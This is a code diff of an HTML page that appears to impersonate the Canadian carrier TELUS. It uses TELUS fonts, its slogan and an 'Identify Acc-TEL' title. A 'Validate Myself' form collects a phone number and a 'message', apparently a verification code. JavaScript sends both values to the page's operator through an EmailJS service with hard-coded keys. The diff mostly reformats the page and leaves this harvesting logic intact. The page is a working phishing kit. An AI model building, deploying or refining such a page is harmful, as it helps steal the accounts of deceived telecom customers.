@@ -1,18 +1,16 @@
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Identify Acc-TEL</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identify Acc-TEL</title> 
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 
-<link rel="stylesheet" href="style.css">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- KEEP ONLY ONE EMAILJS SCRIPT -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
-<!-- KEEP ONLY ONE EMAILJS SCRIPT -->
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-
-<style>
-
-/* YOUR ORIGINAL CSS (RESTORED EXACTLY) */
+    <style>
+/* ===== YOUR ORIGINAL CSS (UNCHANGED) ===== */
 
 .blader {
     display: flex;
@@ -57,12 +55,18 @@
 
 .shora {
     width: 100%;
-    font-family: Arial, sans-serif;
+    font-family: HNforTELUSSA400normal, Arial, sans-serif;
     font-size: 16px;
     background-color: rgb(226, 226, 226);
+    -webkit-font-smoothing: antialiased;
+    letter-spacing: normal !important;
     text-align: center;
     padding: 20px;
+    border-radius: 0;
     box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    max-width: 100%;
+    box-sizing: border-box;
+    overflow: hidden;
 }
 
 .formpage {
@@ -74,11 +78,18 @@
     text-align: center;
     border: 2px solid #f4f2f3;
     border-radius: 8px;
+    height: 100%;
+    max-height: 90vh;
+    overflow-y: auto;
     margin: 0 auto;
+    box-sizing: border-box;
+    position: relative;
 }
 
 h1 {
     color: rgb(75, 40, 109);
+    margin-bottom: 20px;
+    font-family: HNforTELUSSA300normal;
 }
 
 .input-group {
@@ -86,29 +97,49 @@ h1 {
     text-align: left;
 }
 
+.input-group label {
+    font-size: 14px;
+    color: #000000;
+    display: block;
+    margin-bottom: 8px;
+    font-weight: bold;
+}
+
 .input-group input {
     width: 90%;
     padding: 12px;
+    font-size: 16px;
     border: 1px solid #ccc;
+    border-radius: 5px;
 }
 
 .login-btn {
     width: 87%;
     padding: 12px;
+    font-size: 16px;
+    font-weight: bold;
     background-color: rgb(43, 128, 0);
     color: #fff;
     border: none;
+    border-radius: 5px;
     cursor: pointer;
+}
+
+.login-btn:hover {
+    background-color: rgb(43, 128, 0);
 }
 
 .success-message {
     color: green;
+    font-size: 16px;
     margin-top: 15px;
 }
 
 .desktop-footer, .mobile-footer {
     display: none;
     width: 100%;
+    max-width: 100%;
+    height: auto;
 }
 
 @media (min-width: 768px) {
@@ -118,8 +149,7 @@ h1 {
 @media (max-width: 767px) {
     .mobile-footer { display: block; }
 }
-
-</style>
+    </style>
 </head>
 
 <body>
@@ -129,77 +159,94 @@ h1 {
         <img src="images/imagelolopo.svg" alt="Logo" class="logo">
     </div>
     <div class="basic-cont">
-        <div class="cart"><i class="fas fa-shopping-cart"></i></div>
+        <div class="cart">
+            <i class="fas fa-shopping-cart"></i>
+        </div>
         <div class="burger">&#9776;</div>
     </div>
 </header>
 
 <main>
-
-<div class="shora">
-    Proudly Canadian - connecting us all nationwide
-</div>
+<section>
+    <div class="shora">
+        Proudly Canadian - connecting us all nationwide
+    </div>
+</section>
 
 <br><br>
 
+<section>
 <div class="formpage">
     <h1>Validate Myself</h1>
 
     <form id="validateForm">
         <div class="input-group">
-            <label>number</label>
-            <input type="text" id="number" required>
+            <label for="number">number</label>
+            <input type="text" id="number" name="number" required>
         </div>
-
+        
         <div class="input-group">
-            <label>message</label>
-            <input type="text" id="message" required>
+            <label for="message">message</label>
+            <input type="text" id="message" name="message" required>
         </div>
 
         <button type="submit" class="login-btn">Send</button>
     </form>
 
-    <div id="success-message" class="success-message" style="display:none;">
+    <div class="success-message" id="success-message" style="display:none;">
         Thanks You
     </div>
+
+    <div class="footer">
+        <p>Need help? <a href="#">Contact Support</a></p>
+    </div>
 </div>
-
-</main>
-
-<footer>
-    <img src="images/imagedon2.png" class="desktop-footer">
-    <img src="images/imagebacha.jpeg" class="mobile-footer">
-</footer>
 
 <script>
 (function(){
     emailjs.init("9VeQ6k6s9FIpEwG8P");
 })();
 
-document.getElementById("validateForm").addEventListener("submit", function(e){
-    e.preventDefault();
+window.onload = function() {
 
-    const number = document.getElementById("number").value;
-    const message = document.getElementById("message").value;
+    document.getElementById('validateForm').onsubmit = function(e) {
+        e.preventDefault();
 
-    emailjs.send(
-        "service_a4i7zon",
-        "template_fs1memt",
-        {
+        const number = document.getElementById('number').value;
+        const message = document.getElementById('message').value;
+
+        const templateParams = {
             number: number,
             message: message
-        },
-        "9VeQ6k6s9FIpEwG8P"
-    )
-    .then(function(){
-        document.getElementById("success-message").style.display = "block";
-    })
-    .catch(function(error){
-        console.log(error);
-        alert("Error: " + error.text);
-    });
-});
+        };
+
+        emailjs.send(
+            "service_a4i7zon",
+            "template_fs1memt",
+            templateParams,
+            "9VeQ6k6s9FIpEwG8P"
+        )
+        .then(function(response) {
+            console.log("SUCCESS!", response);
+            document.getElementById('success-message').style.display = 'block';
+            document.getElementById('validateForm').style.display = 'none';
+        })
+        .catch(function(error) {
+            console.log("ERROR:", error);
+            alert("Error: " + error.text);
+        });
+    };
+
+};
 </script>
+
+</section>
+</main>
+
+<footer>
+    <img src="images/imagedon2.png" class="desktop-footer">
+    <img src="images/imagebacha.jpeg" class="mobile-footer">
+</footer>
 
 </body>
 </html>
